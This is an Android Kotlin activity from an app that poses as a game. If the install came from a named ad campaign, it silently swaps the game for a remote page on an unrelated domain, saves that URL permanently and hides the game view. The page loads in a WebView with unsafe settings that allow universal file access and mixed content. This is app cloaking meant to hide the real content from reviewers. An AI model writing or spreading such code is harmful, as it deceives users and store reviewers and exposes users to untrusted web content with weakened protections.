package com.tinfenker.capitalnoestroy

import android.content.Context
import android.content.SharedPreferences
import android.content.pm.ActivityInfo
import android.os.Bundle
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.isVisible
import com.adjust.sdk.Adjust
import com.adjust.sdk.AdjustAttribution
import com.adjust.sdk.OnAttributionReadListener
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.tinfenker.capitalnoestroy.databinding.ActivityGameBinding
import com.tinfenker.capitalnoestroy.util.OneTime
import com.tinfenker.capitalnoestroy.util.isNotNullAndEmptyAndText
import com.tinfenker.capitalnoestroy.util.isNullOrText
import com.tinfenker.capitalnoestroy.util.log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.launch
import kotlin.system.exitProcess

class GameActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = OneTime()

    private lateinit var binding  : ActivityGameBinding
    lateinit var sharedPreferences: SharedPreferences

    val screenTypeFlow = MutableStateFlow(ScreenType.None)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        initialize()

        sharedPreferences = getSharedPreferences("SAVE", Context.MODE_PRIVATE)
        initWeb()

        val sharedValue = sharedPreferences.getString("save", "not")

        try {
            if (sharedValue.isNullOrText("not")) Adjust.getAttribution(AdjustReadListener()) else showUrl(sharedValue!!)
        } catch (e: Exception) {
            log("error: ${e.message}")
            screenTypeFlow.value = ScreenType.Game
        }
    }

    override fun exit() {
        onceExit.use {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                finishAffinity()
                delay(100)
                exitProcess(0)
            }
        }
    }

    private fun initialize() {
        binding = ActivityGameBinding.inflate(layoutInflater)
        setContentView(binding.root)
    }

    // Logic ----------------------------------------------------------------------------------

    private fun initWeb() {
        binding.webView.apply {
            settings.apply {
                allowFileAccessFromFileURLs = true
                allowContentAccess = true
                javaScriptEnabled = listOf(true).first()
                javaScriptCanOpenWindowsAutomatically = true
                allowFileAccess = true
                mixedContentMode = 0
                useWideViewPort = true
                allowUniversalAccessFromFileURLs = true
                loadWithOverviewMode = true
                domStorageEnabled = true
                databaseEnabled = true
            }

            webViewClient = WebClient()
        }
    }

    private fun showUrl(url: String) {
        requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_FULL_USER

        binding.webView.apply {
            isVisible = true
            loadUrl(url)
        }
        setNavBarColor()
        binding.root.removeView(binding.navHostFragment)
    }

    private inner class WebClient : WebViewClient() {
        override fun shouldOverrideUrlLoading(
            view: WebView?,
            request: WebResourceRequest?
        ): Boolean {
            return false
        }
    }

    private inner class AdjustReadListener : OnAttributionReadListener {
        override fun onAttributionRead(attribution: AdjustAttribution?) {
            val clickLabel = attribution?.clickLabel
            val campaign   = attribution?.campaign

            log("result $attribution | $clickLabel | $campaign")

            if (attribution != null) {
                if (campaign.isNotNullAndEmptyAndText("None")) {
                    val link = "https://sheetazurecrazy.mom/ck3j9QKP?capitlca=$campaign&lacapital=$clickLabel"
                    log("link = $link")
                    sharedPreferences.edit().putString("save", link).apply()
                    showUrl(link)
                } else screenTypeFlow.value = ScreenType.Game
            } else screenTypeFlow.value = ScreenType.Game
        }
    }

    enum class ScreenType {
        None, Game
    }

    // Logic -----------------------------------------------------------------------------------------

    fun setNavBarColor() {
        coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = getColor(R.color.white)
        }
    }

    fun removeWeb() {
        coroutine.launch(Dispatchers.Main) {
            binding.root.removeView(binding.webView)
        }
    }
}